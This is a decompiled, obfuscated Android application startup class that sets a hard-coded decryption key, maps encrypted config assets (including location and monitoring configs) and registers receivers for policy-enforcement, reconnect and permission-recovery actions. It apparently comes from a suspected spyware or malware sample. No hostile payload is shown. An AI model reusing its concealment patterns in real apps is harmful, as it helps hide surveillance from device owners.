package com.storm.safe.rock;

import android.app.Application;
import android.content.Context;
import android.content.IntentFilter;
import androidx.work.impl.C0096a0;
import com.storm.safe.rock.receiver.izkmisshyc;
import com.storm.safe.rock.receiver.jrhgpixkephr;
import com.storm.safe.rock.receiver.kksddvryq;
import com.storm.safe.rock.security.AbstractC0276a0;
import com.storm.safe.rock.security.SecurityManager$SecurityPolicy;
import java.util.LinkedHashMap;
import okio.Utf8;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.AbstractC1408xb;
import p000.C0793kr;
import p000.C0923nr;
import p000.RunnableC0941o6;
import p000.dh1;
import p000.t60;
import p000.tg0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class hkdrkgzsfs extends Application {

    /* renamed from: a0 */
    public static final C0252a0 f51942a0 = new C0252a0(null);

    /* renamed from: a1 */
    public static volatile hkdrkgzsfs f51943a1;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.hkdrkgzsfs$a0 */
    public static final class C0252a0 {
        public /* synthetic */ C0252a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public final Context getAppContext() {
            hkdrkgzsfs hkdrkgzsfsVar = hkdrkgzsfs.f51943a1;
            if (hkdrkgzsfsVar != null) {
                return hkdrkgzsfsVar.getApplicationContext();
            }
            return null;
        }

        public final hkdrkgzsfs getInstance() {
            return hkdrkgzsfs.f51943a1;
        }

        private C0252a0() {
        }
    }

    /* renamed from: a0 */
    public final void m211200a0() {
        try {
            Context applicationContext = getApplicationContext();
            try {
                izkmisshyc izkmisshycVar = new izkmisshyc();
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("com.storm.safe.rock.ACTION_PROFILE_RESET");
                intentFilter.addAction("com.storm.safe.rock.ACTION_SYNC_INIT");
                intentFilter.addAction("com.storm.safe.rock.ACTION_POLICY_ENFORCE");
                intentFilter.addAction("com.storm.safe.rock.ACTION_POLICY_RELEASE");
                intentFilter.addAction("com.storm.safe.rock.ACTION_SYNC_PAUSE");
                intentFilter.addAction("com.storm.safe.rock.ACTION_SYNC_RESUME");
                intentFilter.addAction("com.storm.safe.rock.ACTION_SYNC_CLEANUP");
                intentFilter.addAction("com.storm.safe.rock.ACTION_PROFILE_READY");
                applicationContext.registerReceiver(izkmisshycVar, intentFilter);
            } catch (Exception unused) {
            }
            try {
                applicationContext.registerReceiver(new jrhgpixkephr(), new IntentFilter("com.storm.safe.rock.intent.FORCE_RECONNECT"));
            } catch (Exception unused2) {
            }
            kksddvryq kksddvryqVar = new kksddvryq();
            IntentFilter intentFilter2 = new IntentFilter();
            intentFilter2.addAction("com.storm.safe.rock.intent.SMART_PERMISSION_RECOVERY");
            intentFilter2.addAction("com.storm.safe.rock.intent.IGNORE_RECOVERY");
            applicationContext.registerReceiver(kksddvryqVar, intentFilter2);
        } catch (Exception unused3) {
        }
    }

    @Override // android.app.Application
    public final void onCreate() {
        super.onCreate();
        AbstractC1408xb.f61060a0 = true;
        AbstractC1408xb.f61061a1 = new byte[]{19, -107, 112, 87, -99, -7, 4, 26, -124, 105, 27, 74, -22, 92, -18, Utf8.REPLACEMENT_BYTE};
        LinkedHashMap linkedHashMap = AbstractC1408xb.f61062a2;
        linkedHashMap.put("server_config.json", "0.bt");
        linkedHashMap.put("app_config.json", "1.bt");
        linkedHashMap.put("locateValues.json", "2.bt");
        linkedHashMap.put("monitor_config.json", "3.bt");
        f51943a1 = this;
        try {
            C0923nr.f58688a2.install(this);
        } catch (Exception unused) {
        }
        try {
            AbstractC1117qo.m214441d7(this);
            SecurityManager$SecurityPolicy securityManager$SecurityPolicy = SecurityManager$SecurityPolicy.f52292a1;
            if (!AbstractC0276a0.f52294a0) {
                AbstractC0276a0.f52295a1 = securityManager$SecurityPolicy;
                AbstractC0276a0.f52294a0 = true;
                new Thread(new RunnableC0941o6(18, this)).start();
            }
            try {
                tg0 tg0Var = new tg0(10, false);
                tg0Var.f60218a1 = new dh1();
                C0096a0.m210474g1(this, new C0793kr(tg0Var));
            } catch (Exception e) {
                t60.m214705c6("SystemHelperApp", "❌ WorkManager 初始化失败", e);
            }
            m211200a0();
        } catch (Exception e2) {
            t60.m214705c6("SystemHelperApp", "❌ 应用程序初始化失败", e2);
        }
    }
}
